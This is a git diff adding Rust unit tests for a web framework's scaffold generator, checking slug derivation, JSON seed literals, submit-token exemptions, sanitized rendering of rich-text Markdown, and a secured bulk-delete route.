+        assert!(routes.contains("new.slug = candidate;"), "{routes}");
+    }
+
+    #[test]
+    fn scaffold_slug_field_update_also_auto_derives_when_blank() {
+        // AC4's blank-derives-a-slug behavior isn't create-only: the form
+        // exposes the slug as a plain optional input on BOTH create and
+        // edit, so clearing it on edit must re-derive too, or the record's
+        // NOT NULL column ends up literally "" and its own `/{slug}` route
+        // becomes unreachable (issue #1260 review finding).
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        // Both the `create` AND `update` handlers get a derive block — assert
+        // it appears twice, not just once (i.e. not only on create).
+        assert_eq!(
+            routes.matches("if new.slug.is_empty() {").count(),
+            2,
+            "expected a derive block in both create and update: {routes}"
+        );
+        // The update path's collision probe excludes the record's own
+        // current row (identified by the path extractor's old value),
+        // otherwise a no-op re-derivation of an unchanged title would
+        // spuriously collide with itself.
+        assert!(
+            routes.contains(
+                "posts::table\n                .filter(posts::slug.eq(&candidate))\n                \
+                 .filter(posts::slug.ne(&__route_key))"
+            ),
+            "{routes}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_update_redirects_to_the_persisted_slug_not_the_stale_path_value() {
+        // If the user changes (or blanks and re-derives) the slug on edit,
+        // the success redirect must resolve the JUST-PERSISTED value —
+        // redirecting to the old path-extractor value 404s (issue #1260
+        // review finding).
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains(
+                "flash.success(\"Post updated\").await;\n    \
+                 Ok(autumn_web::Redirect::to(&paths::show(&new.slug)).into_response())"
+            ),
+            "{routes}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_named_like_an_extractor_param_does_not_collide() {
+        // Review finding: a slug field literally named `db` (a valid
+        // `snake_case` declaration, `db:slug{from:title}`) previously
+        // destructured straight to `Path(db): Path<String>`, colliding with
+        // the SAME handler's own `mut db: Db` extractor parameter — a
+        // duplicate-binding compile error. `flash`/`body`/`csrf`/`session`
+        // are the same class of bug. The extractor must bind to a fixed
+        // internal name regardless of the field's actual name.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "db:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        // The extractor's local binding is the fixed internal name, not `db`.
+        assert!(
+            routes.contains("Path(__route_key): Path<String>"),
+            "{routes}"
+        );
+        assert!(!routes.contains("Path(db): Path<String>"), "{routes}");
+        // The URL placeholder and schema column still use the real field name.
+        assert!(routes.contains(r#"#[get("/posts/{db}")]"#), "{routes}");
+        assert!(
+            routes.contains("posts::table\n        .filter(posts::db.eq(&__route_key))"),
+            "{routes}"
+        );
+        // No handler signature now declares `db` twice (once as the route-key
+        // extractor, once as `mut db: Db`) — every `show`/`edit`/`update`/
+        // `destroy` still gets exactly one `db: Db`/`mut db: Db` parameter.
+        // Scan the parameter list between `fn <handler>(` and the matching
+        // `{` that opens the function body.
+        for handler in ["fn show(", "fn edit_form(", "fn update(", "fn destroy("] {
+            let start = routes.find(handler).unwrap_or_else(|| {
+                panic!("missing handler {handler} in generated routes: {routes}")
+            });
+            let body_start = routes[start..]
+                .find(" -> AutumnResult")
+                .unwrap_or_else(|| routes[start..].find('{').unwrap());
+            let sig = &routes[start..start + body_start];
+            assert_eq!(
+                sig.matches("db: ").count(),
+                1,
+                "handler signature declares `db` more than once: {sig}"
+            );
+        }
+    }
+
+    #[test]
+    fn scaffold_slug_field_collision_loop_never_settles_on_the_reserved_new_segment() {
+        // `GET /{plural}/new` is a static route; axum's router always prefers
+        // it over the `GET /{plural}/{slug}` capture, so a record whose slug
+        // were literally "new" would be permanently unreachable at its own
+        // show page. The derive loop must keep probing past it.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains("if count == 0 && candidate != \"new\" {"),
+            "{routes}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_collision_loop_also_reserves_search_when_searchable() {
+        // `--searchable` emits a second static sibling route, `GET
+        // /{plural}/search`, which the router would likewise prefer over
+        // `GET /{plural}/{slug}` for a record whose derived slug were
+        // literally "search".
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    searchable: vec!["title".into()],
+                    ..Default::default()
+                },
+                ..Default::default()
+            },
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains("if count == 0 && candidate != \"new\" && candidate != \"search\" {"),
+            "{routes}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_form_input_is_not_required() {
+        // AC4's auto-derive-on-blank only ever runs if a blank submission can
+        // reach the server: a plain HTML5 `required` attribute on the slug
+        // input would have the browser block submission first. The DB column
+        // stays `NOT NULL` (AC3); only the form control must render as
+        // optional (the issue's own words: "the generated form may expose it
+        // as a plain optional text input").
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains(".exclude(\"slug\")"),
+            "the slug field must be excluded from the derived (required-by-default) \
+             control so it can be re-appended as optional: {routes}"
+        );
+        assert!(
+            routes.contains("autumn_web::a11y::TextField::new(\"slug\")"),
+            "{routes}"
+        );
+        // The appended slug control must never carry `.required()` — grab the
+        // slice from its `TextField::new` call up to the next field's block
+        // (or the appends' end) and check `.required()` doesn't appear in it.
+        let start = routes
+            .find("autumn_web::a11y::TextField::new(\"slug\")")
+            .expect("slug TextField control");
+        let end = routes[start..]
+            .find("}})")
+            .map_or(routes.len(), |i| start + i);
+        let slug_control = &routes[start..end];
+        assert!(
+            !slug_control.contains(".required()"),
+            "slug control must not be required: {slug_control}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_field_index_and_show_links_use_slug_not_id() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(routes.contains("paths::show(&row.slug)"), "{routes}");
+        assert!(routes.contains("paths::edit(&row.slug)"), "{routes}");
+        assert!(!routes.contains("paths::show(row.id)"), "{routes}");
+        assert!(!routes.contains("paths::edit(row.id)"), "{routes}");
+    }
+
+    #[test]
+    fn scaffold_slug_requires_from_modifier() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug".into()],
+            "20260427000000",
+        )
+        .unwrap_err();
+        assert!(err.to_string().contains("from"), "{err}");
+    }
+
+    #[test]
+    fn scaffold_slug_from_unknown_field_is_rejected() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["slug:slug{from:headline}".into()],
+            "20260427000000",
+        )
+        .unwrap_err();
+        assert!(err.to_string().contains("headline"), "{err}");
+    }
+
+    #[test]
+    fn scaffold_slug_with_live_is_rejected() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                live: true,
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap_err();
+        assert!(
+            err.to_string().contains("--live"),
+            "expected a `--live` rejection, got: {err}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_with_sharded_is_rejected() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    sharded: true,
+                    ..ModelOptions::default()
+                },
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap_err();
+        assert!(
+            err.to_string().contains("--sharded"),
+            "expected a `--sharded` rejection, got: {err}"
+        );
+    }
+
+    #[test]
+    fn scaffold_slug_with_attachment_field_is_rejected() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "slug:slug{from:title}".into(),
+                "cover:Attachment".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap_err();
+        assert!(err.to_string().contains("Attachment"), "{err}");
+    }
+
+    #[test]
+    fn scaffold_slug_with_state_machine_field_is_rejected() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &[
+                "title:String".into(),
+                "slug:slug{from:title}".into(),
+                "status:String:states(draft -> published)".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap_err();
+        assert!(err.to_string().contains("states"), "{err}");
+    }
+
+    #[test]
+    fn scaffold_slug_from_defaulted_field_is_rejected() {
+        // A `--default` column is dropped from the generated `New{Pascal}`
+        // insert struct entirely (issue #1260 review finding), so the create
+        // handler's `new.{from}` read would not compile.
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    defaults: vec!["title=Untitled".into()],
+                    ..Default::default()
+                },
+                ..Default::default()
+            },
+        )
+        .unwrap_err();
+        let msg = err.to_string();
+        assert!(
+            msg.contains("title") && msg.contains("default"),
+            "unexpected error: {msg}"
+        );
+    }
+
     #[test]
     fn scaffold_smoke_test_creates_a_stub_referenced_table_before_the_real_one() {
         // The generated smoke test runs in its own throwaway `TestDb` (one
@@ -12170,6 +19389,50 @@ async fn main() {
     }
 
     #[test]
+    fn json_sample_literals_are_pairwise_distinct_and_valid_jsonb() {
+        let a = sql_sample_literal(FieldKind::Json);
+        let b = unique_sample_literal(FieldKind::Json);
+        let c = unique_sample_literal_variant(FieldKind::Json);
+        assert!(a != b && b != c && a != c, "{a}, {b}, {c}");
+        for literal in [&a, &b, &c] {
+            assert!(
+                literal.ends_with("'::jsonb"),
+                "must be a jsonb-cast SQL literal: {literal}"
+            );
+            let inner = literal
+                .trim_start_matches('\'')
+                .trim_end_matches("'::jsonb");
+            assert!(
+                serde_json::from_str::<serde_json::Value>(inner).is_ok(),
+                "{literal} must contain valid JSON"
+            );
+        }
+    }
+
+    #[test]
+    fn json_seed_value_varies_per_row_for_unique_columns() {
+        // Issue #1341 review: a constant `'{}'::jsonb` for every row (the
+        // `sql_sample_literal` fallback) would collide on the very first
+        // re-insert for a `unique` json column in the `--api` smoke test's
+        // 25-row (`API_SMOKE_TEST_SEED_ROWS`) seed — must vary with `g`, same
+        // as the text/numeric/timestamp arms.
+        let f = csv_test_field("config", FieldKind::Json, false);
+        let expr = sql_seed_value_expr(&f);
+        assert!(
+            expr.contains(" g "),
+            "must vary per row via the generate_series index: {expr}"
+        );
+        assert!(
+            expr.ends_with("::jsonb"),
+            "must be a jsonb-cast expression: {expr}"
+        );
+        assert!(
+            serde_json::from_str::<serde_json::Value>("{\"seed\": 1}").is_ok(),
+            "sanity: the woven shape is valid JSON"
+        );
+    }
+
+    #[test]
     fn enum_rejection_insert_sql_fits_tightly_scaled_decimal_column() {
         // Regression test: a `decimal{1,1}` column (valid range `(-1,1)`)
         // combined with a required enum column used to get a fixed "1.0"
@@ -12310,13 +19573,14 @@ async fn main() {
         )
         .unwrap();
         let routes = action_contents(&plan, "src/routes/posts.rs");
-        // edit / update / destroy carry an inline authorize call.
+        // edit / update / destroy carry an inline authorize call, and (issue
+        // #1312) bulk_delete authorizes each selected row before deleting it.
         assert_eq!(
             routes
                 .matches("autumn_web::authorization::authorize::<Post>")
                 .count(),
-            3,
-            "edit/update/destroy must each authorize: {routes}"
+            4,
+            "edit/update/destroy/bulk_delete must each authorize: {routes}"
         );
         assert!(routes.contains("\"edit\", &row"), "{routes}");
         assert!(routes.contains("\"update\", &current"), "{routes}");
@@ -12601,8 +19865,8 @@ async fn main() {
             routes
                 .matches("autumn_web::authorization::authorize::<Post>")
                 .count(),
-            3,
-            "no-owner edit/update/destroy must each authorize: {routes}"
+            4,
+            "no-owner edit/update/destroy/bulk_delete must each authorize: {routes}"
         );
         assert!(
             routes
@@ -12682,7 +19946,7 @@ async fn main() {
     #[test]
     fn submit_token_exempt_appends_fresh_block_when_absent() {
         let existing = "[server]\nport = 3000\n";
-        let out = append_submit_token_validate_exempt_to_toml(existing, "posts")
+        let out = append_submit_token_exempt_to_toml(existing, "posts", "validate")
             .expect("absent exemption must be inserted");
         assert!(out.contains("[security.submit_token]"), "{out}");
         assert!(
@@ -12696,7 +19960,7 @@ async fn main() {
     #[test]
     fn submit_token_exempt_is_idempotent() {
         let existing = "[security.submit_token]\nexempt_paths = [\"/posts/validate\"]\n";
-        let out = append_submit_token_validate_exempt_to_toml(existing, "posts");
+        let out = append_submit_token_exempt_to_toml(existing, "posts", "validate");
         assert_eq!(
             out, None,
             "re-adding the same prefix must be a no-op returning None"
@@ -12707,7 +19971,7 @@ async fn main() {
     fn submit_token_exempt_merges_into_existing_array() {
         let existing =
             "[security.submit_token]\nttl_secs = 900\nexempt_paths = [\"/webhooks/x\"]\n";
-        let out = append_submit_token_validate_exempt_to_toml(existing, "posts")
+        let out = append_submit_token_exempt_to_toml(existing, "posts", "validate")
             .expect("a new prefix must be merged into the existing array");
         assert!(out.contains("\"/webhooks/x\""), "{out}");
         assert!(out.contains("\"/posts/validate\""), "{out}");
@@ -12731,7 +19995,7 @@ exempt_paths = [
     \"/webhooks/x\",
 ]
 ";
-        let out = append_submit_token_validate_exempt_to_toml(existing, "posts")
+        let out = append_submit_token_exempt_to_toml(existing, "posts", "validate")
             .expect("a new prefix must be merged into the commented array");
         // The merged output is valid TOML.
         let parsed: toml::Value =
@@ -12753,7 +20017,7 @@ exempt_paths = [
     #[test]
     fn submit_token_exempt_inserts_key_when_block_lacks_it() {
         let existing = "[security.submit_token]\nttl_secs = 900\n";
-        let out = append_submit_token_validate_exempt_to_toml(existing, "posts")
+        let out = append_submit_token_exempt_to_toml(existing, "posts", "validate")
             .expect("a block lacking the key must gain one");
         assert!(
             out.contains("exempt_paths = [\"/posts/validate\"]"),
@@ -12768,7 +20032,7 @@ exempt_paths = [
         // `security.submit_token.field_name`. It must cover the per-field
         // validation routes but never the guarded create route.
         assert_eq!(
-            submit_token_validate_exempt_prefix("posts"),
+            submit_token_exempt_prefix("posts", "validate"),
             "/posts/validate"
         );
     }
@@ -12776,9 +20040,9 @@ exempt_paths = [
     #[test]
     fn remove_submit_token_exempt_drops_fresh_block() {
         let existing = "[server]\nport = 3000\n";
-        let added = append_submit_token_validate_exempt_to_toml(existing, "posts")
+        let added = append_submit_token_exempt_to_toml(existing, "posts", "validate")
             .expect("fresh block must be added");
-        let removed = remove_submit_token_validate_exempt_from_toml(&added, "posts");
+        let removed = remove_submit_token_exempt_from_toml(&added, "posts", "validate");
         assert!(!removed.contains("/posts/validate"), "{removed}");
         assert!(!removed.contains("[security.submit_token]"), "{removed}");
         assert!(removed.contains("[server]"), "{removed}");
@@ -12788,7 +20052,7 @@ exempt_paths = [
     fn remove_submit_token_exempt_keeps_other_entries() {
         let existing =
             "[security.submit_token]\nexempt_paths = [\"/webhooks/x\", \"/posts/validate\"]\n";
-        let removed = remove_submit_token_validate_exempt_from_toml(existing, "posts");
+        let removed = remove_submit_token_exempt_from_toml(existing, "posts", "validate");
         assert!(removed.contains("\"/webhooks/x\""), "{removed}");
         assert!(!removed.contains("/posts/validate"), "{removed}");
         assert!(removed.contains("[security.submit_token]"), "{removed}");
@@ -12798,7 +20062,7 @@ exempt_paths = [
     fn remove_submit_token_exempt_ignores_hand_edited_value() {
         // Never touch an array that no longer carries our exact prefix.
         let existing = "[security.submit_token]\nexempt_paths = [\"/custom/only\"]\n";
-        let removed = remove_submit_token_validate_exempt_from_toml(existing, "posts");
+        let removed = remove_submit_token_exempt_from_toml(existing, "posts", "validate");
         assert_eq!(removed, existing);
     }
 
@@ -12869,6 +20133,312 @@ exempt_paths = [
         assert!(
             !touches_toml,
             "a plain scaffold (no --live-validation) must not add submit-token exemptions"
+        );
+    }
+
+    // ── richtext scaffolding (issue #1255) ─────────────────────────────────
+
+    /// Plan `autumn generate scaffold Post title:String body:richtext` against
+    /// a fresh project — the exact command the issue's success metric names.
+    fn richtext_scaffold_plan(tmp: &TempDir) -> Plan {
+        plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "body:richtext".into()],
+            "20260731000000",
+        )
+        .unwrap()
+    }
+
+    #[test]
+    fn richtext_scaffold_form_uses_the_markdown_editor_widget() {
+        let tmp = project_with_main(default_main());
+        let plan = richtext_scaffold_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            routes.contains("rich_text_area"),
+            "the form must render the Markdown editor, not a bare textarea:\n{routes}"
+        );
+        // The non-richtext column keeps its ordinary control.
+        assert!(routes.contains("\"title\""), "{routes}");
+    }
+
+    #[test]
+    fn richtext_scaffold_show_view_renders_through_the_sanitizer() {
+        let tmp = project_with_main(default_main());
+        let plan = richtext_scaffold_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            routes.contains("autumn_web::markdown::render_user_content(&row.body)"),
+            "the show view must render the stored Markdown through the sanitizing \
+             helper:\n{routes}"
+        );
+        // …and never through the trusted-content renderer or a raw passthrough.
+        assert!(
+            !routes.contains("markdown::render(&row.body)"),
+            "the trusted-content renderer must never see user input:\n{routes}"
+        );
+        assert!(
+            !routes.contains("PreEscaped(&row.body)"),
+            "the raw source must never be emitted pre-escaped:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn richtext_scaffold_index_view_shows_escaped_source_not_markup() {
+        let tmp = project_with_main(default_main());
+        let plan = richtext_scaffold_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        // The index column renders the raw source through maud's escaping
+        // `Render` impl — a table cell must not carry block-level markup, and
+        // escaped text is inherently safe.
+        // `let mut columns:` since issue #1312 prepends the bulk-select column.
+        let columns = routes
+            .split_once("columns: Vec<")
+            .expect("index columns block")
+            .1;
+        let columns = columns.split_once("];").unwrap().0;
+        assert!(
+            !columns.contains("render_user_content"),
+            "index cells render the source as escaped text, not HTML:\n{columns}"
+        );
+    }
+
+    #[test]
+    fn richtext_scaffold_generates_a_preview_route() {
+        let tmp = project_with_main(default_main());
+        let plan = richtext_scaffold_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            routes.contains("#[post(\"/posts/preview/body\")]"),
+            "a richtext column needs a preview endpoint for the htmx live \
+             preview:\n{routes}"
+        );
+        assert!(routes.contains("pub async fn preview_body("), "{routes}");
+        // The preview handler renders through the same sanitizer.
+        let handler = routes
+            .split_once("pub async fn preview_body(")
+            .unwrap()
+            .1
+            .split_once("\n}\n")
+            .unwrap()
+            .0;
+        assert!(
+            handler.contains("render_user_content"),
+            "the preview must be sanitized exactly like the show view:\n{handler}"
+        );
+        // The typed path helper is exported so the form can link to it.
+        assert!(routes.contains("preview_body"), "{routes}");
+    }
+
+    #[test]
+    fn non_nullable_richtext_gets_a_required_signal() {
+        // PR #2157 review: every other non-nullable generated control carries
+        // `required`/`aria-required`. A `body:richtext` column had neither, and
+        // since `String` and `TEXT NOT NULL` both accept `""`, an empty editor
+        // persisted a blank body.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["body:richtext".into(), "note:Option<richtext>".into()],
+            "20260731000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            routes.contains("required_rich_text_area_htmx_with_token_field(changeset, \"body\""),
+            "a non-nullable richtext column needs the required variant:\n{routes}"
+        );
+        assert!(
+            routes.contains("rich_text_area_htmx_with_token_field(changeset, \"note\""),
+            "a nullable richtext column keeps the optional variant:\n{routes}"
+        );
+        assert!(
+            !routes.contains("required_rich_text_area_htmx_with_token_field(changeset, \"note\""),
+            "leaving a nullable column blank is valid — no required signal:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn richtext_preview_does_not_depend_on_the_rest_of_the_form_decoding() {
+        // PR #2157 review: the preview `hx-include`s the whole form, so on a
+        // fresh "new" page every other field is still blank. Decoding the whole
+        // form struct to reach the one previewed field would fail on the first
+        // strictly-typed empty column (`count=` into an `i64`) and blank the
+        // preview until every unrelated field was filled in.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["body:richtext".into(), "count:i64".into()],
+            "20260731000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        let handler = routes
+            .split_once("pub async fn preview_body(")
+            .expect("preview handler")
+            .1
+            .split_once("\n}\n")
+            .unwrap()
+            .0;
+        assert!(
+            handler.contains("field_from_urlencoded"),
+            "the preview must read its one field leniently:\n{handler}"
+        );
+        assert!(
+            !handler.contains("decode_form"),
+            "whole-form decode couples the preview to every other field's \
+             validity:\n{handler}"
+        );
+        assert!(
+            handler.contains("render_user_content"),
+            "the preview must still be sanitized:\n{handler}"
+        );
+    }
+
+    #[test]
+    fn richtext_scaffold_enables_the_markdown_feature() {
+        let tmp = project_with_main(default_main());
+        fs::write(
+            tmp.path().join("Cargo.toml"),
+            "[package]\nname = \"x\"\n\n[dependencies]\nautumn-web = \"0.6.0\"\n",
+        )
+        .unwrap();
+        let plan = richtext_scaffold_plan(&tmp);
+        let cargo = action_contents(&plan, "Cargo.toml");
+        assert!(
+            cargo.contains("markdown"),
+            "a richtext scaffold must enable autumn-web's `markdown` feature so \
+             `render_user_content` resolves:\n{cargo}"
+        );
+    }
+
+    #[test]
+    fn richtext_scaffold_exempts_the_preview_route_from_the_submit_token() {
+        let tmp = project_with_main(default_main());
+        fs::write(
+            tmp.path().join("autumn.toml"),
+            "[security.submit_token]\nfield_name = \"_confirm\"\n",
+        )
+        .unwrap();
+        let plan = richtext_scaffold_plan(&tmp);
+        let toml = action_contents(&plan, "autumn.toml");
+        assert!(
+            toml.contains("/posts/preview"),
+            "the preview POST hx-includes the whole form, so it must not spend \
+             the one-time submit token under a custom field name:\n{toml}"
+        );
+        assert!(
+            plan.reverts.iter().any(|r| matches!(
+                r,
+                Revert::SubmitTokenValidateExempt { segment, .. } if segment == "preview"
+            )),
+            "the inserted preview exemption must be reverted on destroy"
+        );
+    }
+
+    #[test]
+    fn defaulted_richtext_column_mounts_no_preview_route() {
+        // A `--default`ed column is dropped from the form, so the routes module
+        // emits no `preview_{field}` handler for it. Mounting one anyway in
+        // `main.rs` fails the generated app to compile with `cannot find value
+        // preview_body in module routes::posts`.
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "body:richtext".into()],
+            "20260731000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    defaults: vec!["body=hi".to_owned()],
+                    ..Default::default()
+                },
+                ..Default::default()
+            },
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        let main_rs = action_contents(&plan, "src/main.rs");
+        assert_eq!(
+            routes.contains("pub async fn preview_body("),
+            main_rs.contains("routes::posts::preview_body"),
+            "the mounted route set must match the handlers actually emitted\n\
+             routes:\n{routes}\nmain:\n{main_rs}"
+        );
+        // The show view still displays the column, so the feature is still needed.
+        assert!(
+            routes.contains("render_user_content(&row.body)"),
+            "a defaulted richtext column still renders on the detail page:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn api_richtext_scaffold_skips_the_html_only_wiring() {
+        // `--api` renders no form and no show view, so a richtext column is
+        // just a TEXT column carrying Markdown source out over JSON. Pulling in
+        // the `markdown` feature (and exempting a preview route that is never
+        // generated) would be dead weight.
+        let tmp = project_with_main(default_main());
+        fs::write(
+            tmp.path().join("Cargo.toml"),
+            "[package]\nname = \"x\"\n\n[dependencies]\nautumn-web = \"0.6.0\"\n",
+        )
+        .unwrap();
+        fs::write(
+            tmp.path().join("autumn.toml"),
+            "[security.submit_token]\nfield_name = \"_confirm\"\n",
+        )
+        .unwrap();
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "body:richtext".into()],
+            "20260731000000",
+            &ScaffoldOptions {
+                api: true,
+                ..Default::default()
+            },
+        )
+        .unwrap();
+        let cargo = action_contents(&plan, "Cargo.toml");
+        assert!(
+            !cargo.contains("\"markdown\""),
+            "--api has no view that renders Markdown:\n{cargo}"
+        );
+        let toml = action_contents(&plan, "autumn.toml");
+        assert!(
+            !toml.contains("/posts/preview"),
+            "--api generates no preview route to exempt:\n{toml}"
+        );
+    }
+
+    #[test]
+    fn non_richtext_scaffold_stays_untouched_by_the_richtext_wiring() {
+        let tmp = project_with_main(default_main());
+        fs::write(
+            tmp.path().join("Cargo.toml"),
+            "[package]\nname = \"x\"\n\n[dependencies]\nautumn-web = \"0.6.0\"\n",
+        )
+        .unwrap();
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "body:Text".into()],
+            "20260731000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(!routes.contains("rich_text_area"), "{routes}");
+        assert!(!routes.contains("render_user_content"), "{routes}");
+        assert!(!routes.contains("/posts/preview"), "{routes}");
+        let cargo = action_contents(&plan, "Cargo.toml");
+        assert!(
+            !cargo.contains("markdown"),
+            "a scaffold with no richtext column must not pull in the markdown \
+             feature:\n{cargo}"
         );
     }
 
@@ -12955,6 +20525,4118 @@ exempt_paths = [
         assert!(
             !has_revert,
             "a preexisting, user-owned exemption must not be claimed via a revert"
+        );
+    }
+
+    // ── bulk-select + delete-selected (issue #1312) ────────────────────────
+
+    /// The default `Post` field set used by the bulk-delete tests.
+    fn bulk_fields() -> Vec<String> {
+        vec![
+            "title:String".to_owned(),
+            "body:Text".to_owned(),
+            "published:bool".to_owned(),
+        ]
+    }
+
+    /// Plan a `Post` scaffold with `options` and return its routes file source.
+    fn bulk_routes(options: &ScaffoldOptions) -> String {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &bulk_fields(),
+            "20260427000000",
+            options,
+        )
+        .unwrap();
+        action_contents(&plan, "src/routes/posts.rs")
+    }
+
+    /// The default (non-live, non-sharded) `Post` scaffold's routes source.
+    fn bulk_routes_default() -> String {
+        bulk_routes(&ScaffoldOptions::default())
+    }
+
+    /// Slice out the body of a named `pub async fn` handler in a routes file:
+    /// everything from its signature up to the next top-level `pub async fn`.
+    fn handler_slice<'a>(routes: &'a str, name: &str) -> &'a str {
+        let needle = format!("pub async fn {name}(");
+        let start = routes.find(&needle).unwrap_or_else(|| {
+            panic!("routes file must emit `{needle}`:\n{routes}");
+        });
+        let rest = &routes[start + needle.len()..];
+        rest.split("pub async fn ").next().unwrap_or(rest)
+    }
+
+    #[test]
+    fn index_wraps_list_in_bulk_delete_form() {
+        let routes = bulk_routes_default();
+        assert!(routes.contains("bulk_actions_form("), "{routes}");
+        assert!(routes.contains("paths::bulk_delete()"), "{routes}");
+        let index = handler_slice(&routes, "index");
+        let form_at = index
+            .find("bulk_actions_form(")
+            .unwrap_or_else(|| panic!("index must wrap its list in the bulk form:\n{index}"));
+        let table_at = index
+            .find("data_table(")
+            .unwrap_or_else(|| panic!("index must still render the data_table:\n{index}"));
+        assert!(
+            form_at < table_at,
+            "the bulk form must wrap the data_table, not follow it:\n{index}"
+        );
+    }
+
+    #[test]
+    fn index_prepends_bulk_select_checkbox_column() {
+        let routes = bulk_routes_default();
+        let index = handler_slice(&routes, "index");
+        assert!(index.contains("columns.insert(0,"), "{index}");
+        assert!(index.contains("bulk_select_checkbox("), "{index}");
+    }
+
+    #[test]
+    fn index_handler_takes_csrf_for_bulk_form() {
+        let routes = bulk_routes_default();
+        let index = handler_slice(&routes, "index");
+        assert!(index.contains("csrf: Option<CsrfToken>"), "{index}");
+        assert!(
+            index.contains("csrf_field: Option<CsrfFormField>"),
+            "{index}"
+        );
+    }
+
+    #[test]
+    fn bulk_delete_handler_is_secured_and_routed() {
+        let routes = bulk_routes_default();
+        assert!(
+            routes.contains("#[secured]\n#[post(\"/posts/bulk_delete\")]"),
+            "the bulk delete route must be #[secured]: {routes}"
+        );
